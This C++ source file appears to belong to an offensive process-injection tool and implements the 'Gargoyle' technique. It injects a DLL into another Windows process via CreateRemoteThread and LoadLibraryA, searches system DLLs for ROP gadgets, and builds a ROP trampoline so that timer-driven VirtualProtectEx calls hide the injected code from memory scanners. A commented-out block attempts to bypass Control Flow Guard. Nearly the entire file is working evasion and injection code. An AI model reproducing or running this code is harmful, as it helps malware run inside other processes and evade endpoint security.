#include "executors/gargoyle.h"
#include "util.h"
#include <psapi.h>
#include <synchapi.h>
#include <utility>
#include <windows.h>
#include <winnt.h>

#ifdef DEBUG
#include <errhandlingapi.h>
#include <stdio.h>
#endif

Gargoyle::Gargoyle() {}
Gargoyle::~Gargoyle() {}

// loads a module in the target process through CRT -> LL
HMODULE Gargoyle::load_module(MemoryWriter *mw, const char *dll_path) {

  LPTHREAD_START_ROUTINE load_library_address =
      (LPTHREAD_START_ROUTINE)GetProcAddress(
          GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");

  DWORD_PTR addr =
      mw->write((LPVOID)dll_path, strlen(dll_path), NULL, PAGE_READWRITE);
  HANDLE new_thread_address =
      CreateRemoteThread(mw->get_target_process(), NULL, 0,
                         load_library_address, (LPVOID)addr, 0, NULL);

  if (new_thread_address == NULL) {
#ifdef DEBUG
    printf("Failed to create thread to load target module in target process: "
           "%d\n",
           GetLastError());
#endif
    return NULL;
  }
  if (WaitForSingleObject(new_thread_address, INFINITE) == WAIT_FAILED) {
    printf("Failed to wait for library loading thread: %d\n", GetLastError());
  }

  HMODULE module = get_remote_module(mw->get_target_process(), dll_path);

  if (module == NULL) {
#ifdef DEBUG
    printf("Failed to load target module in target_process. Did you use a "
           "full path to the module? %d\n",
           GetLastError());
#endif
    return NULL;
  }
  return module;
}

BOOL Gargoyle::find_rop_gadget_offset(struct rop_gadget *gadget) {
  // first, load the library in our own process (we just want to find the
  // offset)
  HMODULE module = LoadLibraryA(gadget->module_name);
  if (module == NULL) {
#ifdef DEBUG
    printf("Failed to load %s\n: %d\n", gadget->module_name, GetLastError());
#endif
    return FALSE;
  }

  // now we find every executable section and search it for our ROP gadget

  PIMAGE_NT_HEADERS pe_headers = (PIMAGE_NT_HEADERS)(
      ((PIMAGE_DOS_HEADER)module)->e_lfanew + (DWORD_PTR)module);

  DWORD number_of_sections =
      ((PIMAGE_FILE_HEADER)((DWORD_PTR)pe_headers + 0x4))->NumberOfSections;
  // section table starts right after optional header
  PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER)(
      (DWORD_PTR)&pe_headers->OptionalHeader +
      (DWORD_PTR)((PIMAGE_FILE_HEADER)((DWORD_PTR)pe_headers + 0x4))
          ->SizeOfOptionalHeader);
  for (int ii = 0; ii < number_of_sections; ii++) {
    if (section_table->Characteristics & IMAGE_SCN_MEM_EXECUTE) {

      for (DWORD_PTR offset = 0;
           offset < section_table->Misc.VirtualSize - gadget->instructions_size;
           offset++) {
        if (memcmp((BYTE *)(section_table->VirtualAddress + (DWORD_PTR)module +
                            offset),
                   gadget->instructions, gadget->instructions_size) == 0) {
          gadget->offset = offset + section_table->VirtualAddress;
          FreeLibrary(module);
          return TRUE;
        }
      }
    }
    section_table++;
  }
#ifdef DEBUG
  printf("Failed to locate ROP gadget in %s\n", gadget->module_name);
#endif
  FreeLibrary(module);
  return FALSE;
}

BOOL Gargoyle::execute(MemoryWriter *mw, LPVOID data_to_write,
                       DWORD data_size) {

  std::pair<LPVOID, SIZE_T> new_data =
      load_sections((DWORD_PTR)data_to_write, data_size);
  data_to_write = new_data.first;
  data_size = new_data.second;

  // start as RWX, we will jump to gargoyle which will setup the timers,
  // do some work, and become R
  DWORD_PTR dll_addr =
      mw->write(data_to_write, data_size, NULL, PAGE_EXECUTE_READWRITE);

  // now we find gargoyle export in dll
  DWORD_PTR start_addr = (DWORD_PTR)data_to_write;

  PIMAGE_NT_HEADERS pe_headers = (PIMAGE_NT_HEADERS)(
      ((PIMAGE_DOS_HEADER)start_addr)->e_lfanew + start_addr);

  PIMAGE_DATA_DIRECTORY export_directory = &(
      (pe_headers->OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_EXPORT]);

  PIMAGE_EXPORT_DIRECTORY export_table =
      (PIMAGE_EXPORT_DIRECTORY)(export_directory->VirtualAddress + start_addr);

  LPDWORD address_table =
      (LPDWORD)(start_addr + export_table->AddressOfFunctions);
  LPDWORD name_pointer_table =
      (LPDWORD)(start_addr + export_table->AddressOfNames);
  LPWORD ordinal_table =
      (LPWORD)(start_addr + export_table->AddressOfNameOrdinals);

  DWORD_PTR gargoyle_offset = NULL;

  for (int ii = 0; ii < export_table->NumberOfNames; ii++) {
    if (strcmp("gargoyle", (char *)(start_addr + *name_pointer_table)) == 0) {
      gargoyle_offset = (DWORD_PTR)(address_table[*ordinal_table]);
      break;
    }
    name_pointer_table++;
    ordinal_table++;
  }

  if (gargoyle_offset == NULL) {
#ifdef DEBUG
    printf("Unable to locate gargoyle export in the DLL. Did you make sure to "
           "compile the DLL with gargoyle.asm?\n");
#endif
    return FALSE;
  }

  // now we setup our rop gadgets

  struct rop_gadget pop_rcx_pop_rsp_ret;
  pop_rcx_pop_rsp_ret.instructions = (BYTE *)malloc(3 * sizeof(BYTE));
  pop_rcx_pop_rsp_ret.instructions[0] = 0x59;
  pop_rcx_pop_rsp_ret.instructions[1] = 0x5c;
  pop_rcx_pop_rsp_ret.instructions[2] = 0xc3;
  pop_rcx_pop_rsp_ret.instructions_size = 3;
  pop_rcx_pop_rsp_ret.module_name = "C:\\rop.dll";

  struct rop_gadget pop_rcx_ret;
  pop_rcx_ret.instructions = (BYTE *)malloc(2 * sizeof(BYTE));
  pop_rcx_ret.instructions[0] = 0x59;
  pop_rcx_ret.instructions[1] = 0xc3;
  pop_rcx_ret.instructions_size = 2;
  pop_rcx_ret.module_name = "C:\\Windows\\System32\\ieframe.dll";

  struct rop_gadget pop_rdx_ret;
  pop_rdx_ret.instructions = (BYTE *)malloc(2 * sizeof(BYTE));
  pop_rdx_ret.instructions[0] = 0x5a;
  pop_rdx_ret.instructions[1] = 0xc3;
  pop_rdx_ret.instructions_size = 2;
  pop_rdx_ret.module_name = "C:\\Windows\\System32\\ieframe.dll";

  struct rop_gadget pop_r8_ret;
  pop_r8_ret.instructions = (BYTE *)malloc(3 * sizeof(BYTE));
  pop_r8_ret.instructions[0] = 0x41;
  pop_r8_ret.instructions[1] = 0x58;
  pop_r8_ret.instructions[2] = 0xc3;
  pop_r8_ret.instructions_size = 3;
  pop_r8_ret.module_name = "C:\\Windows\\System32\\ieframe.dll";

  struct rop_gadget pop_r9_ret;
  pop_r9_ret.instructions = (BYTE *)malloc(3 * sizeof(BYTE));
  pop_r9_ret.instructions[0] = 0x41;
  pop_r9_ret.instructions[1] = 0x59;
  pop_r9_ret.instructions[2] = 0xc3;
  pop_r9_ret.instructions_size = 3;
  pop_r9_ret.module_name = "C:\\Windows\\System32\\AdmTmpl.dll";

  struct rop_gadget add_rsp_30_ret;
  add_rsp_30_ret.instructions = (BYTE *)malloc(5 * sizeof(BYTE));
  add_rsp_30_ret.instructions[0] = 0x48;
  add_rsp_30_ret.instructions[1] = 0x83;
  add_rsp_30_ret.instructions[2] = 0xc4;
  add_rsp_30_ret.instructions[3] = 0x30;
  add_rsp_30_ret.instructions[4] = 0xc3;
  add_rsp_30_ret.instructions_size = 5;
  add_rsp_30_ret.module_name = "C:\\Windows\\System32\\MSMPEG2ENC.dll";

  if (!find_rop_gadget_offset(&pop_rcx_pop_rsp_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'pop rcx; pop rsp; ret' gadget in %s\n",
           pop_rcx_pop_rsp_ret.module_name);
#endif
    return FALSE;
  }

  if (!find_rop_gadget_offset(&pop_rcx_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'pop rcx; ret' gadget in %s\n",
           pop_rcx_ret.module_name);
#endif
    return FALSE;
  }

  if (!find_rop_gadget_offset(&pop_rdx_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'pop rdx; ret' gadget in %s\n",
           pop_rdx_ret.module_name);
#endif
    return FALSE;
  }

  if (!find_rop_gadget_offset(&pop_r8_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'pop r8; ret' gadget in %s\n",
           pop_r8_ret.module_name);
#endif
    return FALSE;
  }

  if (!find_rop_gadget_offset(&pop_r9_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'pop r9; ret' gadget in %s\n",
           pop_r9_ret.module_name);
#endif
    return FALSE;
  }

  if (!find_rop_gadget_offset(&add_rsp_30_ret)) {
#ifdef DEBUG
    printf("Unable to locate 'add rsp 0x30; ret' gadget in %s\n",
           add_rsp_30_ret.module_name);
#endif
    return FALSE;
  }

  pop_rcx_pop_rsp_ret.module_base =
      (DWORD_PTR)load_module(mw, pop_rcx_pop_rsp_ret.module_name);
  if (pop_rcx_pop_rsp_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'pop rcx; pop rsp; ret'\n",
           pop_rcx_pop_rsp_ret.module_name);
#endif
    return FALSE;
  }

  pop_rcx_ret.module_base = (DWORD_PTR)load_module(mw, pop_rcx_ret.module_name);
  if (pop_rcx_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'pop rcx; ret'\n",
           pop_rcx_ret.module_name);
#endif
    return FALSE;
  }

  pop_rdx_ret.module_base = (DWORD_PTR)load_module(mw, pop_rdx_ret.module_name);
  if (pop_rdx_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'pop rdx; ret'\n",
           pop_rdx_ret.module_name);
#endif
    return FALSE;
  }

  pop_r8_ret.module_base = (DWORD_PTR)load_module(mw, pop_r8_ret.module_name);
  if (pop_r8_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'pop r8; ret'\n",
           pop_r8_ret.module_name);
#endif
    return FALSE;
  }

  pop_r9_ret.module_base = (DWORD_PTR)load_module(mw, pop_r9_ret.module_name);
  if (pop_r9_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'pop r9; ret'\n",
           pop_r9_ret.module_name);
#endif
    return FALSE;
  }

  add_rsp_30_ret.module_base =
      (DWORD_PTR)load_module(mw, add_rsp_30_ret.module_name);
  if (add_rsp_30_ret.module_base == NULL) {
#ifdef DEBUG
    printf("Failed to load module %s for gadget 'add rsp 0x30; ret'\n",
           add_rsp_30_ret.module_name);
#endif
    return FALSE;
  }

  struct GargoyleArgument garg_arg;

  // explanation of trampoline in gargoyle.h

  garg_arg.tramp.pop_rcx_ret_ptr = pop_rcx_ret.offset + pop_rcx_ret.module_base;
  // -1 is current process (trampoline in same memory space as gargoyle)
  garg_arg.tramp.proc_handle = -1;
  garg_arg.tramp.pop_rdx_ret_ptr = pop_rdx_ret.offset + pop_rdx_ret.module_base;
  garg_arg.tramp.addr = dll_addr;
  garg_arg.tramp.pop_r8_ret_ptr = pop_r8_ret.offset + pop_r8_ret.module_base;
  garg_arg.tramp.size = data_size;
  garg_arg.tramp.pop_r9_ret_ptr = pop_r9_ret.offset + pop_r9_ret.module_base;
  garg_arg.tramp.new_protection = PAGE_EXECUTE_READWRITE;
  garg_arg.tramp.VirtualProtectEx_ptr = get_remote_proc_address(
      mw->get_target_process(), "C:\\Windows\\System32\\KERNEL32.dll",
      "VirtualProtectEx");
  garg_arg.tramp.add_rsp_30_ret_ptr =
      add_rsp_30_ret.offset + add_rsp_30_ret.module_base;
  // this is just after magic bytes. we don't care about old protections but we
  // cannot set this argument to NULL or VirtualProtectEx will complain, so we
  // point it to some memory we can write to without affecting anything
  // in gargoyle, VirtualProtectEx uses the .conf.dump variable, but because
  // we have not written garg_arg to target process' memory yet, we cannot know
  // the address of this yet
  garg_arg.tramp.old_protection_ptr = dll_addr + 0x2;
  garg_arg.tramp.pop_rcx_ret_ptr2 = garg_arg.tramp.pop_rcx_ret_ptr;
  // we don't set gargoyle_arg_ptr because we set this on
  // the first invocation (we only need this attribute
  // when the invocation comes from APC -> stack trampoline
  garg_arg.tramp.gargoyle_addr = gargoyle_offset + dll_addr;

  garg_arg.conf.initialized = 0;
  garg_arg.conf.pop_rcx_pop_rsp_ret =
      pop_rcx_pop_rsp_ret.offset + pop_rcx_pop_rsp_ret.module_base;
  garg_arg.conf.pop_rcx_ret = garg_arg.tramp.pop_rcx_ret_ptr;
  garg_arg.conf.pop_rdx_ret = garg_arg.tramp.pop_rdx_ret_ptr;
  garg_arg.conf.pop_r8_ret = garg_arg.tramp.pop_r8_ret_ptr;
  garg_arg.conf.add_rsp_30_ret = garg_arg.tramp.add_rsp_30_ret_ptr;
  garg_arg.conf.VirtualProtectEx_ptr = garg_arg.tramp.VirtualProtectEx_ptr;
  garg_arg.conf.WaitForSingleObjectEx_ptr = get_remote_proc_address(
      mw->get_target_process(), "C:\\Windows\\System32\\KERNEL32.dll",
      "WaitForSingleObjectEx");
  garg_arg.conf.timer_period = 10000;
  garg_arg.conf.base_ptr = dll_addr;
  garg_arg.conf.dll_size = data_size;
  garg_arg.conf.dump = 0;
  garg_arg.conf.tramp_copy = garg_arg.tramp;

  // write gargoyle argument to target process somewhere
  DWORD_PTR garg_arg_addr =
      mw->write(&garg_arg, sizeof(garg_arg), NULL, PAGE_READWRITE);

  /* The following code should make the pop_rcx_pop_rsp_ret rop gadget CFG valid
but it didn't seem to work, but keeping it here in case we need it in the future

  NTSTATUS(*NtSetInformationVirtualMemory_ptr)
  (HANDLE, int, ULONG_PTR, PMEMORY_RANGE_ENTRY, PVM_INFORMATION, ULONG) =
      (NTSTATUS(*)(HANDLE, int, ULONG_PTR, PMEMORY_RANGE_ENTRY, PVM_INFORMATION,
                   ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                         "NtSetInformationVirtualMemory");

  MODULEINFO info;
  GetModuleInformation(mw->get_target_process(),
                       (HMODULE)pop_rcx_pop_rsp_ret.module_base, &info,
                       sizeof(info));

  CFG_CALL_TARGET_INFO ccti;
  ccti.Flags = CFG_CALL_TARGET_VALID;
  ccti.Offset = pop_rcx_pop_rsp_ret_offset - pop_rcx_pop_rsp_ret_offset % 16;

  MEMORY_RANGE_ENTRY memory_range_entry;
  memory_range_entry.VirtualAddress = (PVOID)pop_rcx_pop_rsp_ret.module_base;
  memory_range_entry.NumberOfBytes = info.SizeOfImage;

  DWORD out;
  VM_INFORMATION vm_information;
  vm_information.num_offsets = 1;
  vm_information.output = &out;
  vm_information.offsets = &ccti;
  vm_information.unk1 = 0;
  vm_information.unk2 = 0;

  // here, 2 means VmCfgCallTargetInformation
  NTSTATUS result = (*NtSetInformationVirtualMemory_ptr)(
      mw->get_target_process(), 2, 1, &memory_range_entry, &vm_information,
      sizeof(vm_information));

  if (result != 0) {
#ifdef DEBUG
    printf("Failed to make target CFG valid: %llx\n", result);
#endif
  }
  */

  HANDLE thread =
      CreateRemoteThread(mw->get_target_process(), NULL, 0,
                         (LPTHREAD_START_ROUTINE)garg_arg.tramp.gargoyle_addr,
                         (LPVOID)garg_arg_addr, 0, NULL);
  if (thread == NULL) {
#ifdef DEBUG
    printf("Failed to create thread in target process to launch gargoyle: %d\n",
           GetLastError());
#endif
    return FALSE;
  }
#ifdef DEBUG
  printf("Successfully injected DLL at %p\nGargoyle entrypoint at %p\nGargoyle "
         "argument at %p\n\n",
         dll_addr, garg_arg.tramp.gargoyle_addr, garg_arg_addr);

  printf("Rop gadgets:\n"
         "'pop rcx; pop rsp; ret' at %p\n"
         "'pop rcx; ret' at %p\n"
         "'pop rdx; ret' at %p\n"
         "'pop r8; ret' at %p\n"
         "'pop r9; ret' at %p\n"
         "'add rsp, 0x30; ret' at %p\n\n"
         "Function addresses:\n"
         "VirtualProtectEx at %p\n"
         "WaitForSingleObjectEx at %p\n",
         garg_arg.conf.pop_rcx_pop_rsp_ret, garg_arg.conf.pop_rcx_ret,
         garg_arg.conf.pop_rdx_ret, garg_arg.conf.pop_r8_ret,
         garg_arg.tramp.pop_r9_ret_ptr, garg_arg.conf.add_rsp_30_ret,
         garg_arg.conf.VirtualProtectEx_ptr,
         garg_arg.conf.WaitForSingleObjectEx_ptr);
#endif

  return TRUE;
}
